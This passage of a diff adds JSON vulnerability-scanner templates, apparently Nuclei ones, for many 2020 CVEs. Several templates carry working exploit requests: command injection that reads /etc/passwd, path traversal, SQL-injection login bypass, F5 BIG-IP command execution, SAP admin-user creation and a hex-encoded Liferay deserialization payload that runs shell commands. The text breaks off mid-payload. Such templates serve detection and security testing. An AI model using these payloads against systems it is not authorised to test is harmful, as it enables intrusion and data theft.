+            "POST /mifs/.;/services/LogService HTTP/1.1\nHost: {{Hostname}}\nReferer: https://{{Hostname}}\nContent-Type: x-application/hessian\nConnection: close\n\n{{hex_decode('630200480004')}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-15920",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "There is an OS Command Injection in Mida eFramework through 2.9.0 that allows an attacker to achieve Remote Code Execution (RCE) with administrative (root) privileges. No authentication is required.",
+        "name": "Unauthenticated RCE at Mida eFramework on 'PDC/ajaxreq.php'",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/PDC/ajaxreq.php?PARAM=127.0.0.1+-c+0%3B+cat+%2Fetc%2Fpasswd&DIAGNOSIS=PING"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-16139",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Cisco 7937G Denial-of-Service Reboot Attack",
+        "severity": "low"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/xml"
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /localmenus.cgi?func=609&rphl=1&data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-16846",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "SaltStack Salt through 3002. Sending crafted web requests to the Salt API,\nwith the SSH client enabled, can result in shell injection.\n\nThis template supports the detection part only. See references.\n\nReferences:\n- https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag\n- https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846\n",
+        "name": "SaltStack Shell Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "body": "token=1337&client=ssh&tgt=*&fun=a&roster=projectdiscovery&ssh_priv=nuclei",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "status": [
+                500
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "An unexpected error occurred"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/run",
+            "{{BaseURL}}:8000/run"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-16952",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "Microsoft SharePoint Server-Side Include (SSI) and ViewState RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "or",
+              "part": "body",
+              "regex": [
+                "15\\.0\\.0\\.(4571|5275|4351|5056)",
+                "16\\.0\\.0\\.(10337|10364|10366)"
+              ],
+              "type": "regex"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "MicrosoftSharePointTeamServices"
+              ]
+            },
+            {
+              "condition": "or",
+              "status": [
+                200,
+                201
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-17505",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Artica Web Proxy 4.30.000000 allows an authenticated remote attacker to inject commands via the service-cmds parameter in cyrus.php. These commands are executed with root privileges via service_cmds_peform.",
+        "name": "Artica Web Proxy 4.30 OS Command Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "cookie-reuse": true,
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "array(2)",
+                "Position: ||whoami||",
+                "root"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27; HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n",
+            "GET /cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-17506",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Artica Web Proxy 4.30.00000000 allows remote attacker to bypass privilege detection and gain web backend administrator privileges through SQL injection of the apikey parameter in fw.login.php.",
+        "name": "Artica Web Proxy 4.30 Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "kval": [
+                "PHPSESSID"
+              ],
+              "type": "kval"
+            }
+          ],
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "artica-applianc"
+              ]
+            },
+            {
+              "condition": "or",
+              "status": [
+                200,
+                301,
+                302
+              ],
+              "type": "status"
+            },
+            {
+              "name": "session",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "PHPSESSID"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "max-redirects": 1,
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;"
+          ],
+          "redirects": true
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-2096",
+      "info": {
+        "author": "madrobot",
+        "name": "Jenkins Gitlab Hook XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<svg/onload=alert(1337)>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/gitlab/build_now%3Csvg/onload=alert(1337)%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-2140",
+      "info": {
+        "author": "j3ssie/geraldino2",
+        "description": "Jenkins Audit Trail Plugin 3.2 and earlier does not escape the error message for the URL Patterns field form validation, resulting in a reflected cross-site scripting vulnerability.",
+        "name": "Jenkin AuditTrailPlugin XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<h1>sample"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample",
+            "{{BaseURL}}/jenkins/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-24223",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Mara CMS  7.5 - Reflective Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"><script>alert(document.domain)</script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/contact.php?theme=tes%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-24312",
+      "info": {
+        "author": "x1m_martijn",
+        "name": "WordPress Plugin File Manager (wp-file-manager) Backup Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "Index of"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/uploads/wp-file-manager-pro/fm_backup/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-2551",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "This template supports the detection part only. See references.\n\nVulnerability in the Oracle WebLogic Server product of\nOracle Fusion Middleware (component: WLS Core Components).\nSupported versions that are affected are 10.3.6.0.0, 12.1.3.0.0,\n12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability\nallows unauthenticated attacker with network access via IIOP\nto compromise Oracle WebLogic Server.\n\nSuccessful attacks of this vulnerability can result\nin takeover of Oracle WebLogic Server.\n\nSource/References:\n- https://github.com/hktalent/CVE-2020-2551\n",
+        "name": "Unauthenticated Oracle WebLogic Server RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "or",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "10.3.6.0",
+                "12.1.3.0",
+                "12.2.1.3",
+                "12.2.1.4"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/console/login/LoginForm.jsp",
+            "{{BaseURL}}:7001/console/login/LoginForm.jsp"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-25540",
+      "info": {
+        "author": "geeknik",
+        "description": "ThinkAdmin v6 is affected by a directory traversal vulnerability. An unauthorized attacker can read arbitrarily file on a remote server via GET request encode parameter.",
+        "name": "ThinkAdmin 6 - Arbitrarily File Read (CVE-2020-25540)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-26214",
+      "info": {
+        "author": "CasperGN",
+        "description": "Alerta prior to version 8.1.0 is prone to Authentication Bypass when using LDAP as authorization provider and the LDAP server accepts Unauthenticated Bind reqests.",
+        "name": "Alerta Authentication Bypass (CVE-2020-26214)",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "group": 1,
+              "name": "alerta-version",
+              "part": "body",
+              "regex": [
+                "name\":\"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\"",
+                "name\": \"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\""
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "or",
+              "regex": [
+                "name\":\"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\"",
+                "name\": \"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\""
+              ],
+              "type": "regex"
+            },
+            {
+              "condition": "or",
+              "regex": [
+                "provider\":\"ldap\"",
+                "provider\": \"ldap\""
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/config"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-3187",
+      "info": {
+        "author": "KareemSe1im",
+        "name": "CVE-2020-3187",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "webvpn",
+                "Webvpn"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/+CSCOE+/session_password.html"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-3452",
+      "info": {
+        "author": "pdteam",
+        "name": "CVE-2020-3452",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "INTERNAL_PASSWORD_ENABLED",
+                "CONF_VIRTUAL_KEYBOARD"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",
+            "{{BaseURL}}/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5284",
+      "info": {
+        "author": "Harsh & Rahul & dwisiswant0",
+        "name": "Next.js .next/ limited path traversal",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "\\{\"/_app\":\".*?_app\\.js\""
+              ],
+              "type": "regex"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/_next/static/../server/pages-manifest.json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5405",
+      "info": {
+        "author": "Harsh Bothra",
+        "name": "Spring Cloud Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5410",
+      "info": {
+        "author": "mavericknerd",
+        "name": "Directory Traversal in Spring Cloud Config Server",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}:8080/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development",
+            "{{BaseURL}}:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5412",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Spring Cloud Netflix, versions 2.2.x prior to 2.2.4, versions 2.1.x prior to 2.1.6, and older unsupported versions allow applications to use the Hystrix Dashboard proxy.stream endpoint to make requests to any server reachable by the server hosting the dashboard. A malicious user, or attacker, can send a request to other servers that should not be exposed publicly.",
+        "name": "Full-read SSRF in Spring Cloud Netflix (Hystrix Dashboard)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Burp Collaborator Server"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Jelly"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/proxy.stream?origin=http://burpcollaborator.net/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5776",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Currently, all versions of MAGMI are vulnerable to CSRF due to the lack of CSRF tokens. RCE (via phpcli command) is possible in the event that a CSRF is leveraged against an existing admin session for MAGMI.",
+        "name": "Cross Site Request Forgery (CSRF) in MAGMI (Magento Mass Importer) Plugin",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "PHP Extension",
+                "PHP Version"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /magmi/web/magmi_saveprofile.php HTTP/1.1\nHost: {{Hostname}}\nContent-type: application/x-www-form-urlencoded\nConnection: close\n\nprofile=default&PLUGINS_DATASOURCES%3Aclasses=&PLUGINS_DATASOURCES%3Aclass=Magmi_CSVDataSource&CSV%3Aimportmode=remote&CSV%3Abasedir=var%2Fimport&CSV%3Aremoteurl=[https%3A%2F%2Fraw.githubusercontent.com%2Fprojectdiscovery%2Fnuclei-templates%2Fmaster%2Fpayloads%2FCVE-2020-5776.csv]&CSV%3Aremotecookie=&CSV%3Aremoteuser=&CSV%3Aremotepass=&CSV%3Aseparator=&CSV%3Aenclosure=&CSV%3Aheaderline=&PLUGINS_GENERAL%3Aclasses=Magmi_ReindexingPlugin&Magmi_ReindexingPlugin=on&REINDEX%3Aphpcli=echo+%22%3C%3Fphp+phpinfo()%3B%22+%3E+%2Fvar%2Fwww%2Fhtml%2Fmagmi%2Fweb%2Finfo.php%3B+php+&REINDEX%3Aindexes=cataloginventory_stock&cataloginventory_stock=on&PLUGINS_ITEMPROCESSORS%3Aclasses=\n",
+            "POST /magmi/web/magmi_run.php HTTP/1.1\nHost: {{Hostname}}\nContent-type: application/x-www-form-urlencoded\nConnection: close\n\nengine=magmi_productimportengine%3AMagmi_ProductImportEngine&ts=1598879870&run=import&logfile=progress.txt&profile=default&mode=update\n",
+            "GET /magmi/web/info.php HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5777",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "MAGMI versions prior to 0.7.24 are vulnerable to a remote authentication bypass due to allowing default credentials in the event there is a database connection failure.",
+        "name": "Remote Auth Bypass in MAGMI (Magento Mass Importer) Plugin <= v0.7.23",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Too many connections"
+              ]
+            },
+            {
+              "status": [
+                503
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /index.php/catalogsearch/advanced/result/?name=e HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5902",
+      "info": {
+        "author": "madrobot & dwisiswant0 & ringo",
+        "name": "F5 BIG-IP TMUI RCE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "or",
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:",
+                "BIG-IP release ([\\d.]+)",
+                "[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{7}",
+                "HSQL Database Engine Servlet"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+            "{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release",
+            "{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license",
+            "{{BaseURL}}/hsqldb%0a"
+          ]
+        },
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "h3ll0_w0Rld"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\ncommand=create%20cli%20alias%20private%20list%20command%20bash\n",
+            "POST /tmui/locallb/workspace/fileSave.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\nfileName=%2Ftmp%2Fnonexistent&content=echo%20%27aDNsbDBfdzBSbGQK%27%20%7C%20base64%20-d\n",
+            "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\ncommand=list%20%2Ftmp%2Fnonexistent\n",
+            "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\ncommand=delete%20cli%20alias%20private%20list\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-6287",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "Create an Administrative User in SAP NetWeaver AS JAVA (LM Configuration Wizard)",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "urn:CTCWebServiceSi"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "payloads": {
+            "data": "payloads/CVE-2020-6287.xml"
+          },
+          "raw": [
+            "POST /CTCWebService/CTCWebServiceBean/ConfigServlet HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=UTF-8\nConnection: close\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:CTCWebServiceSi\"><soapenv:Header/><soapenv:Body><urn:executeSynchronious><identifier><component>sap.com/tc~lm~config~content</component><path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path></identifier><contextMessages><baData>{{base64('§data§')}}</baData><name>userDetails</name></contextMessages></urn:executeSynchronious></soapenv:Body></soapenv:Envelope>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-7209",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "LinuxKI Toolset 6.01 Remote Command Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-7961",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "Liferay Portal Unauthenticated RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "attack": "sniper",
+          "extractors": [
+            {
+              "part": "body",
+              "regex": [
+                "Microsoft Windows (.*)",
+                "kern\\.ostype: (.*)",
+                "Distributor ID: (.*)"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "or",
+              "part": "body",
+              "regex": [
+                "OS Name:.*Microsoft Windows",
+                "Distributor ID:",
+                "kern\\.ostype"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "payloads": {
+            "command": [
+              "systeminfo",
+              "lsb_release -a",
+              "sysctl kern.ostype"
+            ],
+            "port": [
+              "80",
+              "443",
+              "8080"
+            ]
+          },
+          "raw": [
+            "POST /api/jsonws/invoke HTTP/1.1\nHost: {{Hostname}}:§port§\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55\nContent-Length: 4938\nAccept: */*\nAccept-Language: en\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData\nX-Requested-With: XMLHttpRequest\ncmd2: §command§\n\ncmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=nuclei&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C